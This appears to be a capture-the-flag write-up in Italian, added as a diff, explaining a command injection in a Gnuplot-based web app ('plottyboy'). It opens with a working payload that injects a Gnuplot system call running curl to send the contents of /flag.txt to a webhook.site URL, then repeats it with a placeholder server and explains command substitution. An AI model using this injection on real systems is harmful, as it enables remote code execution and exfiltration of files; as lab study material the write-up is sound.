@@ -1,0 +1,33 @@
+x**2; system "curl https://webhook.site/84cfa616-56c1-4369-9b23-64103e615218/?flag=$(cat /flag.txt)"
+1. Gnuplot e system
+Gnuplot ha un comando integrato system che esegue comandi shell direttamente dal terminale.
+Esempio in Gnuplot puro:
+# Esegue 'ls' e mostra l'output
+system "ls -la"
+# Salva l'output in una variabile
+output = system("echo hello")
+
+
+2. PyGnuplot (Python + Gnuplot)
+PyGnuplot è un wrapper Python per Gnuplot. Se l'applicazione web (plottyboy) usa PyGnuplot per elaborare i dati, è possibile che:
+Accetti formule matematiche (es. x**2) e le passi a Gnuplot.
+Interpreti male input non sanitizzati, permettendo l'esecuzione di system.
+
+
+3. Payload Confermato per RCE
+Il tuo payload funziona perché:
+x**2; system "curl http://TUO_SERVER/?flag=$(cat /flag.txt)"
+x**2 è una formula matematica valida per Gnuplot.
+Il ; separa i comandi (in Gnuplot e in shell).
+system viene interpretato da Gnuplot come comando shell.
+
+
+
+$(comando) è una sostituzione di comando in Bash/shell:
+Esegue il comando all'interno (cat /flag.txt).
+Sostituisce la stringa con l'output del comando.
+
+$(cat /flag.txt) viene valutato prima che curl sia eseguito.
+Se la flag è CCIT{123}, il comando diventa:
+curl http://TUO_SERVER/?flag=CCIT{123}
+Risultato: Il tuo server riceve una richiesta con la flag nel parametro flag.
